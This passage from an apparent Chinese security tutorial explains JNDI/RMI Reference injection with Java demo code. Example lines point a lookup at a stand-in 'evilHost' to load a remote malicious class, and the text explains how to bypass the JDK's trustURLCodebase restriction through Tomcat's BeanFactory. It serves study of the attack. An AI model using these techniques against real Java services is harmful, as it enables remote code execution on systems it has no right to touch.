function_">clear</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索索引posn上的地址。 </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索地址类型为“addrType”的第一个地址。  </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> <br><span class="hljs-comment">//检索本参考文献中地址的列举。 </span><br>Enumeration&lt;RefAddr&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索引用引用的对象的类名。 </span><br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用的对象的工厂位置。  </span><br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用对象的工厂的类名。  </span><br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//从地址列表中删除索引posn上的地址。    </span><br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索此引用中的地址数。 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//生成此引用的字符串表示形式。</span><br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> <br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Renference</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;rmi://127.0.0.1:8080&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">renference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(renference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要问题在于为何使用了<code>ReferenceWrapper</code></p><p>因为<code>Reference</code>类没有实现<code>Remote</code>和继承<code>UnicastRemoteObject</code>类，所以需要用<code>ReferenceWrapper</code>封装一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ReferenceWrapper.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReferenceWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteReference</span> &#123;<br>    <span class="hljs-keyword">protected</span> Reference wrappee;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6078186197417641456L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReferenceWrapper</span><span class="hljs-params">(Reference var1)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;<br>        <span class="hljs-built_in">this</span>.wrappee = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappee;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>关于继承<code>UnicastRemoteObject</code>的原因</p><p>在Java RMI中，要将一个远程对象导出（即使其成为远程可调用的对象），需要将其扩展为<code>java.rmi.server.UnicastRemoteObject</code>类的子类。这是因为<code>UnicastRemoteObject</code>类提供了一些必要的支持，使得对象能够在远程机器上进行调用。</p><p>具体来说，当一个Java对象通过RMI被远程调用时，需要进行序列化（即将对象转换成一系列字节，以便在网络上传输），然后将序列化后的字节传输到远程机器上进行反序列化（即将字节重新转换成对象）。<code>UnicastRemoteObject</code>类提供了默认的序列化和反序列化机制，以及一些基础的RMI支持。</p></blockquote><h2 id="JNDI-References注入"><a href="#JNDI-References注入" class="headerlink" title="JNDI References注入"></a>JNDI References注入</h2><p>为了在命名服务或目录服务中绑定<code>Java</code>对象，可以使用<code>Java</code>序列化来传输对象，但有时候不太合适，比如<code>Java</code>对象较大的情况。因此JNDI定义了命名引用(<code>Naming References</code>)，后面直接简称引用(<code>References</code>)。这样对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。<br>引用由<code>Reference</code>类来表示，它由地址(<code>RefAddress</code>)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的<code>Java</code>类名，以及用于创建对象的<code>ObjectFactory</code>类的名称和位置。<br><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象。</p><p>所谓的 <code>JNDI</code> 注入就是控制 <code>lookup</code> 函数的参数，这样来使客户端访问恶意的 <code>RMI</code> 或者 <code>LDAP</code> 服务来加载恶意的对象，从而执行代码，完成利用<br>在 <code>JNDI</code> 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 <code>Reference</code> 类实现的。<code>Reference</code> 类表示对存在于命名&#x2F;目录系统以外的对象的引用。<br>具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载 <code>class</code> 字节码文件来实例化</p><p><code>Reference</code> 类常用属性：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">className 远程加载时所使用的类名<br>classFactory 加载的 <span class="hljs-keyword">class</span> 中需要实例化类的名称<br><span class="hljs-symbol">classFactoryLocation</span> 提供 <span class="hljs-symbol">classes</span> 数据的地址可以是 <span class="hljs-symbol">file</span>/<span class="hljs-symbol">ftp</span>/<span class="hljs-symbol">http</span> 等协议<br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> );           <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>此时，假设使用 <code>rmi</code> 协议，客户端通过 <code>lookup</code> 函数请求上面 <code>bind</code> 设置的 <code>Exploit</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Context ctx <span class="hljs-operator">=</span> new InitialContext()<span class="hljs-comment">;</span><br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>因为绑定的是 <code>Reference</code> 对象，客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，到<code>URL</code>： <a href="http://evilhost/Exploit.class">http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p><h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI_RMI"></a>JNDI_RMI</h2><h3 id="低版本JDK运行"><a href="#低版本JDK运行" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Client</span><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>“foo”并不是一个类，而是在服务器端绑定到 RMI 注册表上的一个对象名称（Object name）。当客户端使用 <code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/foo&quot;)</code> 查找时，它会返回该名称下对应的对象，即 <code>EvilClass</code>。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Server</span><br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        String url=<span class="hljs-string">&quot;http://localhost:1098/&quot;</span>;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClass&quot;</span>, url);<br>        registry.bind(<span class="hljs-string">&quot;foo&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br>        System.out.println(<span class="hljs-string">&quot;server ready&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilClass</span><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String key)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;EvilClass&quot;</span>+key);<br>    &#125;<br><br>    &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;IIB block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在创建对象时执行</span><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;static block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在类第一次加载时执行</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span>  <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>python启动http服务器</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027659.png" alt="image-20230226191821488"> </p><blockquote><p>关于这里的端口号有的是1098有的是1099的疑问</p><p>这是因为在服务器端代码 <code>Server.java</code> 中，创建 <code>Reference</code> 对象时，将 <code>url</code> 参数设置为了 <code>&quot;http://localhost:1098/&quot;</code>。这个 URL 是指向一个 HTTP 服务器的地址，而在 <code>getObjectInstance</code> 方法中，并没有使用该 URL，所以在客户端代码中使用 <code>rmi://127.0.0.1:1099/foo</code> 查找时仍然可以返回正确的对象。</p><p>虽然这个示例代码中的 <code>url</code> 参数没有被实际使用到，但是实际上 <code>url</code> 参数用来指定引用对象的远程位置，这个远程位置可以是任何类型的 URL。如果您想要将 <code>url</code> 参数用于远程加载对象，则需要确保在 <code>getObjectInstance</code> 方法中能够正确地解析该 URL，加载对应的对象。</p></blockquote><p>将EvilClass的.class文件放入服务器根目录</p><p><img src="D:/mdimage/image-20230226192019661.png" alt="image-20230226192019661"> </p><p>启动服务端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027009.png" alt="image-20230226192035548"> </p><p>启动客户端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027472.png" alt="image-20230226192046711"> </p><h3 id="高版本JDK运行"><a href="#高版本JDK运行" class="headerlink" title="高版本JDK运行"></a>高版本JDK运行</h3><p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。<br>不加参数，抛出异常：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192034081.png" alt="image-20230226193613482"> </p><p>版本8u351</p><p>经过我的一番苦苦调试（终于tm学会调试了），发现问题出在这里</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192028480.png" alt="image-20230228212541157"> </p><p>加入参数后即可正常运行</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p>其中 <code>getFactoryClassLocation()</code>方法是获取<code>classFactoryLocation</code>地址，可以看到，在 <code>ref != null &amp;&amp; ref.getFactoryClassLocation() != null</code> 的情况下，会对 <code>trustURLCodebase</code> 进行取反，由于在 <code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 版本及以后， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code> ，所以会进入 <code>if</code> 语句，抛出异常。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>如果要解码的对象 <code>r</code> 是远程引用，就需要先解引用然后再调用 <code>NamingManager.getObjectInstance</code>，其中会实例化对应的 <code>ObjectFactory</code> 类并调用其 <code>getObjectInstance</code> 方法，这也符合我们前面打印的 <code>EvilClass</code> 的执行顺序。</p><p>因此为了绕过这里 <code>ConfigurationException</code> 的限制，我们有三种方法: 令 <code>ref</code> 为空，或者 令 <code>ref.getFactoryClassLocation()</code> 为空，或者 * 令 <code>trustURLCodebase</code> 为 <code>true</code></p><p>方法一，令var8为空，语义上看需要 <code>obj</code> 既不是 <code>Reference</code> 也不是 <code>Referenceable</code>。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 <code>RMI</code> 没有操作的空间，因此这种情况不太好利用；</p><p>方法二：令 <code>ref.getFactoryClassLocation()</code> 返回空。即，让 <code>ref</code> 对象的 <code>classFactoryLocation</code> 属性为空，这个属性表示引用所指向对象的对应 <code>factory</code> 名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 <code>factory</code> 是本地代码，则该值为空，这是绕过高版本 <code>JDK</code> 限制的关键；</p><p>方法三：我们已经在上节用过，即在命令行指定 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 参数。</p><p>那就去看看<code>getFactoryClassLocation()</code>方法，以及返回值的赋值情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> classFactoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, RefAddr addr,</span><br><span class="hljs-params">                 String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className, addr);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><p>要满足方法二情况，即让<code>ref.getFactoryClassLocation()</code> 返回空，我们只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>。</p><p>它是负责根据 Reference 对象创建相应的 <code>ObjectFactory</code> 对象，并调用其 <code>getObjectInstance()</code> 方法来生成目标对象的类。</p><p>接着看一下 <code>javax.naming.spi.NamingManager</code> 的解析过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object<br>    <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx,</span><br><span class="hljs-params">                      Hashtable&lt;?,?&gt; environment)</span><br>    <span class="hljs-keyword">throws</span> Exception<br>&#123;<br><br>    ObjectFactory factory;<br><br>    <span class="hljs-comment">// Use builder if installed</span><br>    <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>    <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// builder must return non-null factory</span><br>        factory = builder.createObjectFactory(refInfo, environment);<br>        <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>            environment);<br>    &#125;<br><br>    <span class="hljs-comment">// Use reference if possible</span><br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>        ref = (Reference) refInfo;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>        ref = ((Referenceable)(refInfo)).getReference();<br>    &#125;<br><br>    Object answer;<br><br>    <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>        <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br><br>            factory = getObjectFactoryFromReference(ref, f);<br>            <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                 environment);<br>            &#125;<br>            <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>            <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>            <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>            <span class="hljs-keyword">return</span> refInfo;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>            <span class="hljs-comment">// containing URLs</span><br><br>            answer = processURLAddrs(ref, name, nameCtx, environment);<br>            <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> answer;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// try using any specified factories</span><br>    answer =<br>        createObjectFromFactories(refInfo, name, nameCtx, environment);<br>    <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，在处理 <code>Reference</code> 对象时，会先调用 <code>ref.getFactoryClassName()</code> 获取对应工厂类的名称，也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。</p><p>之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了。但<code>getObjectInstance</code>方法需要你的类实现<code>javax.naming.spi.ObjectFactory</code>接口<br>因此，我们实际上可以指定一个存在于目标 <code>classpath</code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。<br>整个利用过程的主要调用栈如下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs leaf">InitialContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>  RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>    RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">decodeObject</span><span class="hljs-params">()</span></span><br>      NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span><br>          objectfactory = NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectFactoryFromReference</span><span class="hljs-params">()</span></span><br>                  Class<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br>     或:   objectfactory<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br></code></pre></td></tr></table></figure><p>总结一下<br>满足要求的工厂类条件： 存在于目标本地的 <code>CLASSPATH</code> 中实现 <code>javax.naming.spi.ObjectFactory</code> 接口 至少存在一个 <code>getObjectInstance()</code> 方法</p><p>而存在于 <code>Tomcat</code> 依赖包中的 <code>org.apache.naming.factory.BeanFactory</code> 就是个不错的选择<br><code>org.apache.naming.factory.BeanFactory</code> ，这个类在 <code>Tomcat</code> 中，很多 <code>web</code> 应用都会包含，它的关键代码：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs sqf">public <span class="hljs-built_in">Object</span> getObjectInstance(<span 